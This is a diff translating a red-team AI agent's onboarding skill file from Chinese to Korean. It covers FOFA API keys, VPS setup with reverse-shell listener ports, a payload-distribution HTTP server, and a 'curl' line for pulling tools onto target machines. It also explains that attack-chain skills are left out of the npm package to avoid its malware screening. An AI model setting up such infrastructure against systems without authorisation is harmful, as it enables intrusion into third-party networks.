@@ -1,99 +1,99 @@
 ---
 name: redteam-setup
-description: 首次使用引导：引导提供 FOFA_KEY 与 VPS 登录方式、验证通道可用、给出降级口径（工具链由工具箱附件按需获取）
-whenToUse: 用户第一次使用红队模式时；或 redteam_preflight 报出 onboarding.incomplete / 有技能 broken 时；或用户说"环境没配好""工具装一下"
+description: 최초 사용 안내: FOFA_KEY 와 VPS 로그인 방식 제공을 유도하고, 통로 가용성을 검증하며, 강등 기준을 제시한다(도구 체인은 툴박스 첨부로 필요 시 확보)
+whenToUse: 사용자가 레드팀 모드를 처음 쓸 때; 또는 redteam_preflight 가 onboarding.incomplete 를 보고하거나 broken 스킬이 있을 때; 또는 사용자가 "환경 설정이 안 됐다" "도구 좀 설치해 달라" 고 말할 때
 role: plan
 enabled: true
 ---
 
-# 首次使用引导（把环境一次配齐）
+# 최초 사용 안내(환경을 한 번에 갖춘다)
 
-**触发条件**（满足任一即执行本技能，不要跳过）：
-- `redteam_preflight` 返回里 `onboarding.complete=false`；
-- preflight 有 `broken` 技能且原因是"缺环境变量"或"VPS 还是占位符"；
-- 用户第一次进红队模式、或明确说"环境/工具没配好"。
+**발동 조건**(하나라도 해당하면 이 스킬을 실행한다. 건너뛰지 않는다):
+- `redteam_preflight` 반환에서 `onboarding.complete=false`;
+- preflight 에 `broken` 스킬이 있고 그 이유가 "환경 변수 없음" 또는 "VPS 가 아직 자리표시자"일 때;
+- 사용자가 레드팀 모드에 처음 들어왔거나, "환경/도구가 설정되지 않았다" 고 분명히 말할 때.
 
-**核心原则**：**一次性把话说完，一次要齐**。不要挤牙膏式反复找用户要东西——那是这套引导存在的唯一理由。
+**핵심 원칙**: **한 번에 끝까지 말하고, 한 번에 다 요구한다**. 짜내듯 조금씩 사용자에게 계속 요구하지 않는다 — 이것이 이 안내가 존재하는 유일한 이유다.
 
-## 一、先确认你有没有"工具箱"（npm 版默认没有）
+## 1. 먼저 "툴박스"가 있는지 확인한다(npm 판에는 기본적으로 없다)
 
-npm 版 `dsh-redteam-mode` **不随包分发工具安装脚本与 9 份攻击链技能**（隧道 / 凭据 /
-WebShell / 反弹 Shell / 横向移动 / 未授权利用）。原因：npm 的发布期自动审查会把
-"包在安装后自动下载渗透二进制"判定为恶意行为特征，整包会被 Blocked。
+npm 판 `dsh-redteam-mode` 는 **도구 설치 스크립트와 공격 체인 스킬 9개를 패키지에 함께 배포하지 않는다**(터널 / 자격 증명 /
+WebShell / 리버스 셸 / 횡적 이동 / 무단 익스플로잇). 이유: npm 의 배포 시 자동 심사는
+"패키지가 설치 후 침투용 바이너리를 자동으로 내려받는다" 를 악성 행위 특징으로 판정하고, 패키지 전체를 Blocked 처리한다.
 
-- **有** `$DSH_HOME/redteam/setup.sh`（自行取过工具箱、或非 npm 安装）→ 按下面第一、二节走；
-- **没有**（`redteam_preflight` 返回里 `onboarding.setup_script.exists=false`）→ 先去项目
-  GitHub Release 下载 `dsh-redteam-mode-<版本>-toolkit.tar.gz`，解压后按其中 README
-  **由用户自己执行**，再到第三节手动配 `FOFA_KEY` 与 VPS；
-- **都不要**也行：只用本包自带的 14 个侦察/检测向技能（`fofa-recon` / `active-scan` /
-  `nuclei-scan` / `web-fingerprint` / `dir-bruteforce` 等）也能开工，只是拿不到需要落地的成果。
+- `$DSH_HOME/redteam/setup.sh` 가 **있다**(툴박스를 직접 받았거나 npm 이 아닌 설치) → 아래 1, 2절을 그대로 따른다;
+- **없다**(`redteam_preflight` 반환의 `onboarding.setup_script.exists=false`) → 먼저 프로젝트
+  GitHub Release 에서 `dsh-redteam-mode-<버전>-toolkit.tar.gz` 를 내려받고, 압축을 푼 뒤 그 안의 README 에 따라
+  **사용자가 직접 실행**하고, 이어서 3절에서 `FOFA_KEY` 와 VPS 를 수동으로 설정한다;
+- **둘 다 하지 않아도** 된다: 이 패키지에 포함된 정찰/탐지 계열 스킬 14개(`fofa-recon` / `active-scan` /
+  `nuclei-scan` / `web-fingerprint` / `dir-bruteforce` 등)만으로도 작업은 가능하다. 다만 착지가 필요한 성과는 얻지 못한다.
 
-> **红线**：本插件**不替用户下载或安装任何安全工具**。需要什么，说清获取位置，由用户自己取、自己执行。
+> **레드라인**: 이 플러그인은 **사용자 대신 어떤 보안 도구도 내려받거나 설치하지 않는다**. 무엇이 필요한지, 어디서 얻는지 설명하고, 사용자가 직접 받아 직접 실행한다.
 
-## 二、要用户提供什么（一次列清，说清"为什么"和"给到哪"）
+## 2. 사용자에게 무엇을 요구할지(한 번에 다 나열하고, "왜"와 "어디에"를 함께 말한다)
 
-| 要什么 | 为什么必须 | 给到哪 | 没有会怎样 |
+| 요구 사항 | 왜 필수인가 | 어디에 넣는가 | 없으면 어떻게 되는가 |
 | --- | --- | --- | --- |
-| **FOFA_KEY** | 资产测绘（`fofa-recon`）靠它铺开单位互联网资产面；没有就只能靠 crt.sh + 子域枚举，**边缘资产与未备案资产会大量漏掉** | 环境变量 `FOFA_KEY`，或写进 `$DSH_HOME/.env`（脚本会代写） | 测绘能力降级：找不全资产 → 后面四个阶段都受影响 |
-| **VPS 登录方式**（`user@ip` + 私钥路径） | 反弹 Shell 必须落到**公网可控主机**上；载荷投递、隧道中转也依赖它 | `REDTEAM_VPS_HOST`（`用户@主机`）/ `REDTEAM_VPS_KEY`（私钥路径，默认 `$DSH_HOME/redteam/toolkit/vps/id_rsa`） | 拿不到服务器权限、投递不了载荷、进不了内网 |
-| （可选）测绘平台 key | Quake / Hunter / ZoomEye 与 FOFA 结果差异大，交叉能多找出资产 | 环境变量，按需 | 少一路交叉验证 |
-| （可选）允许 apt 安装 | 补系统工具 | 用户自己执行 `sudo apt install …` | 相关技能降级 |
+| **FOFA_KEY** | 자산 매핑(`fofa-recon`)이 이것으로 기관의 인터넷 자산 면을 펼친다; 없으면 crt.sh + 서브도메인 열거에만 의존해야 하므로 **주변 자산과 미신고 자산이 대량으로 누락된다** | 환경 변수 `FOFA_KEY`, 또는 `$DSH_HOME/.env` 에 기록(스크립트가 대신 써 준다) | 매핑 능력 강등: 자산을 다 찾지 못해 → 이후 네 단계 모두 영향을 받는다 |
+| **VPS 로그인 방식**(`user@ip` + 개인 키 경로) | 리버스 셸은 반드시 **공인망에서 제어 가능한 호스트**로 착지해야 한다; 페이로드 전달과 터널 중계도 이것에 의존한다 | `REDTEAM_VPS_HOST`(`사용자@호스트`) / `REDTEAM_VPS_KEY`(개인 키 경로, 기본 `$DSH_HOME/redteam/toolkit/vps/id_rsa`) | 서버 권한을 못 얻고, 페이로드를 전달하지 못하며, 내부망에 들어가지 못한다 |
+| (선택) 매핑 플랫폼 key | Quake / Hunter / ZoomEye 는 FOFA 결과와 차이가 커서 교차 확인으로 자산을 더 찾을 수 있다 | 환경 변수, 필요 시 | 교차 검증 한 갈래가 줄어든다 |
+| (선택) apt 설치 허용 | 시스템 도구 보충 | 사용자가 직접 `sudo apt install …` 실행 | 관련 스킬 강등 |
 
-**话术要求**：列完后**等用户补齐**。不要用"我先用降级方案开工"糊过去——除非用户明确说"就按现有条件打"。
+**말하기 요령**: 나열한 뒤 **사용자가 채울 때까지 기다린다**. "일단 강등안으로 시작하겠다" 고 얼버무리지 않는다 — 사용자가 "지금 조건대로 그냥 진행하라" 고 분명히 말한 경우만 예외다.
 
-**注意**：用户的 key **不要写进仓库、不要贴进报告、不要在 `redteam_chain_add` 的 `tool` 字段里出现**。
-写进 `$DSH_HOME/.env`（脚本已 `chmod 600`）即可。
+**주의**: 사용자의 key 는 **저장소에 쓰지 않고, 보고서에 붙이지 않고, `redteam_chain_add` 의 `tool` 필드에도 나타나지 않게** 한다.
+`$DSH_HOME/.env` 에 기록하면 된다(스크립트가 이미 `chmod 600` 을 걸어 둔다).
 
-### FOFA_KEY 怎么拿（要能指导用户）
-1. 登录 <https://fofa.info> → 右上角头像 → **个人中心 → API Key**；
-2. 个人版限额：10,000 次查询/月、1 秒 1 次并发（**脚本与技能都按 1 秒 1 次限速，不要调高**，超了会触发 45012 封禁）；
-3. 拿到后可以自测：`curl -s "https://fofa.info/api/v1/info/my?key=<KEY>"` —— 返回 `"error":false` 即有效。
+### FOFA_KEY 를 받는 방법(사용자를 안내할 수 있어야 한다)
+1. <https://fofa.info> 에 로그인 → 오른쪽 위 아바타 → **개인 센터 → API Key**;
+2. 개인 요금제 한도: 월 10,000회 조회, 1초에 1회 동시( **스크립트와 스킬 모두 1초 1회로 제한한다. 올리지 않는다**. 초과하면 45012 차단이 걸린다);
+3. 받은 뒤 자체 점검: `curl -s "https://fofa.info/api/v1/info/my?key=<KEY>"` —— `"error":false` 가 나오면 유효하다.
 
-### VPS 怎么准备（要能指导用户）
-- 一台**公网可达**的 Linux VPS（1 核 1G 够用），安全组放行：`22`（SSH）、`9000-9999`（反弹 Shell 监听段）、`9100`（载荷分发）；
-- 生成/放置 SSH 私钥到 `$DSH_HOME/redteam/toolkit/vps/id_rsa`，权限必须 `chmod 600`；
-- 确认连通：`ssh -i <私钥> <user>@<ip> 'echo ok'`；
-- **载荷分发服务**：VPS 上 `~/payload` 目录 + `python3 -m http.server 9100`（tmux 常驻），
-  目标机可 `curl http://<ip>:9100/fscan` 直接拉工具。
+### VPS 를 준비하는 방법(사용자를 안내할 수 있어야 한다)
+- **공인망에서 도달 가능한** Linux VPS 한 대(1코어 1GB 면 충분), 보안 그룹 허용: `22`(SSH), `9000-9999`(리버스 셸 리스닝 구간), `9100`(페이로드 배포);
+- SSH 개인 키를 생성해 `$DSH_HOME/redteam/toolkit/vps/id_rsa` 에 두고, 권한은 반드시 `chmod 600`;
+- 연결 확인: `ssh -i <개인 키> <user>@<ip> 'echo ok'`;
+- **페이로드 배포 서비스**: VPS 의 `~/payload` 디렉터리 + `python3 -m http.server 9100`(tmux 상주),
+  대상 머신에서 `curl http://<ip>:9100/fscan` 으로 도구를 바로 가져올 수 있다.
 
-## 三、配置完的验证（必须做完才算引导成功）
+## 3. 설정 후 검증(끝까지 해야 안내가 성공이다)
 
-逐项实测，**不要只看"文件存在"**：
+항목마다 실측한다. **"파일이 존재한다" 만 보지 않는다**:
 
 ```bash
-# 1) FOFA key 有效
+# 1) FOFA key 유효
 curl -s "https://fofa.info/api/v1/info/my?key=$FOFA_KEY" | grep -o '"error":[a-z]*'
 
-# 2) VPS 可达（载荷服务是否在跑由工具箱的体检脚本负责）
+# 2) VPS 도달 가능(페이로드 서비스가 도는지는 툴박스의 점검 스크립트가 담당한다)
 ssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'echo ok'
 
-# 3) 技能注册表可见
-#    用 redteam_preflight 复核，看 available 列表里实际有哪些技能
+# 3) 스킬 레지스트리 확인
+#     redteam_preflight 로 재확인하고, available 목록에 실제로 어떤 스킬이 있는지 본다
 ```
 
-> 工具二进制与 nuclei 模板库的体检由工具箱里的 `redteam-setup.sh --check` 负责
-> （npm 版不含该脚本，见第一节）。
-## 四、最后一步：写完成标记并复核
+> 도구 바이너리와 nuclei 템플릿 라이브러리의 점검은 툴박스의 `redteam-setup.sh --check` 가 담당한다
+> (npm 판에는 그 스크립트가 없으므로 1절을 본다).
+## 4. 마지막 단계: 완료 표식을 남기고 재확인
 
-配置补齐后，写完成标记（有工具箱脚本时脚本 `--yes` 会自动写；没有就手动写）：
+설정을 채운 뒤 완료 표식을 남긴다(툴박스 스크립트가 있으면 `--yes` 로 자동 기록되고, 없으면 직접 기록한다):
 
 ```bash
 mkdir -p "$DSH_HOME/redteam" && date -Is > "$DSH_HOME/redteam/.setup-complete"
 ```
 
-然后**再跑一次 `redteam_preflight`**，确认：`onboarding.complete=true`、`broken` 为空或只剩用户明确接受降级的项。
-把最终结论按"能用什么 / 缺什么 / 缺的影响是什么"三条报给用户。
+그다음 **`redteam_preflight` 를 한 번 더 실행**해 다음을 확인한다: `onboarding.complete=true`, `broken` 이 비어 있거나 사용자가 명시적으로 강등을 수용한 항목만 남아 있음.
+최종 결론을 "쓸 수 있는 것 / 빠진 것 / 빠진 것의 영향" 세 가지로 사용자에게 보고한다.
 
-**改了 `$DSH_HOME/.env` 后必须重启 dsh web**，否则当前进程读不到新的环境变量——
-这一步要明确告诉用户（智能体不能替他重启）。
+**`$DSH_HOME/.env` 를 고친 뒤에는 반드시 dsh web 을 재시작해야 한다**. 그러지 않으면 현재 프로세스가 새 환경 변수를 읽지 못한다——
+이 단계는 사용자에게 분명히 알려야 한다(에이전트가 대신 재시작할 수 없다).
 
-## 五、用户就是不给某些资源时（降级口径）
+## 5. 사용자가 특정 리소스를 주지 않을 때(강등 기준)
 
-| 缺什么 | 降级方案 | 必须向用户说明的限制 |
+| 빠진 것 | 강등 방안 | 사용자에게 반드시 알려야 할 제한 |
 | --- | --- | --- |
-| FOFA_KEY | crt.sh 证书透明 + `passive-recon` + `recon-pipeline`（subfinder/ksubdomain/dnsx）+ 搜索引擎与备案信息 | **资产收集不完整**，未备案/边缘资产会漏；得分上限受影响 |
-| VPS | 只做不需要落地的成果（账号权限、数据、未授权访问、WebShell 交付） | **拿不到服务器权限、进不了内网**，`boundary`/`internal`/`central-system` 类得分点基本放弃 |
-| 系统工具（nuclei 等） | 用工具箱里的替代品（httpx/subfinder 仍在） | 漏洞发现能力大幅下降，Nday 检测基本瘫痪 |
-| 全部都没有 | 只做纯被动信息收集与资产梳理 | 明确告诉用户"这次只能做到信息收集阶段" |
+| FOFA_KEY | crt.sh 인증서 투명성 + `passive-recon` + `recon-pipeline`(subfinder/ksubdomain/dnsx) + 검색 엔진과 신고 정보 | **자산 수집이 불완전**하다. 미신고/주변 자산이 누락되고, 득점 상한이 영향을 받는다 |
+| VPS | 착지가 필요 없는 성과만 수행(계정 권한, 데이터, 무단 접근, WebShell 납품) | **서버 권한을 못 얻고 내부망에 들어가지 못한다**. `boundary`/`internal`/`central-system` 계열 득점 항목은 사실상 포기한다 |
+| 시스템 도구(nuclei 등) | 툴박스의 대체품 사용(httpx/subfinder 는 남아 있다) | 취약점 발견 능력이 크게 떨어지고 Nday 탐지가 사실상 마비된다 |
+| 전부 없음 | 순수 수동 정보 수집과 자산 정리만 수행 | 이번에는 정보 수집 단계까지만 가능하다는 점을 사용자에게 분명히 알린다 |
 
-**降级决定要写进汇报**：用户需要知道这次是在什么条件下打的。
+**강등 결정은 보고에 적는다**: 사용자는 이번 작업이 어떤 조건에서 수행되었는지 알아야 한다.
